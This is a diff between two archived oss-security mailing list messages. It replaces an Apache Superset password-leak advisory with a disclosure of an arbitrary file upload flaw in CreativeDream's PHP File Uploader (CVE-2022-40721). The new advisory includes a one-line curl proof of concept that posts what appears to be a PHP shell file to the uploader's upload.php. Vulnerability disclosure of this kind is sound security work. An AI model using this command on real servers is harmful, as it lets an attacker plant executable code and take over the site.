@@ -1,21 +1,27 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2022/02/01/4
-Message-ID: <ad888107-5866-84ef-08ff-d34611afc9e6@apache.org>
-Date: Tue, 01 Feb 2022 09:09:24 +0000
-From: Daniel Gaspar <dpgaspar@...che.org>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2022/10/03/3
+Message-Id: <9FDC9C96-19F9-4651-B66D-379E07896378@me.com>
+Date: Mon, 3 Oct 2022 12:17:43 -0400
+From: Larry Cashdollar <larry0@...com>
 To: oss-security@...ts.openwall.com
-Subject: CVE-2021-44451: Apache Superset: API sensitive information leak 
+Subject: CreativeDream software arbitrary file upload
 Content-Type: text/plain; charset=utf-8
 
-Description:
 
-Apache Superset up to and including 1.3.2 allowed for registered database connections password leak for authenticated users. This information could be accessed in a non-trivial way.
-
-Mitigation:
-
-Upgrade to Apache Superset 1.4.0 or higher.
-
-Credit:
-
-Found and reported by Cesar Santos
+Title: CreativeDream software arbitrary file upload
+Author: Larry W. Cashdollar
+Date: 2022-09-08
+CVE-ID:[CVE-2022-40721]
+Download Site: https://github.com/CreativeDream
+Vendor: CreativeDream
+Vendor Notified: 2020-02-19
+Vendor Contact: yuliangagarin [at] mail.ru
+References: https://github.com/CreativeDream/php-uploader/issues/23
+Advisory: http://www.vapidlabs.com/advisory.php?v=216
+Description: PHP File Uploader is an easy to use, hi-performance File Upload Script which allows you to upload/download files to webserver.
+Vulnerability:
+The software allows executable file uploads to the web root directory.
+Export: JSON TEXT XML
+Exploit Code:
+	• curl -vk http://localhost/php-uploader/examples/upload.php -F "files=@...ll.php"
 
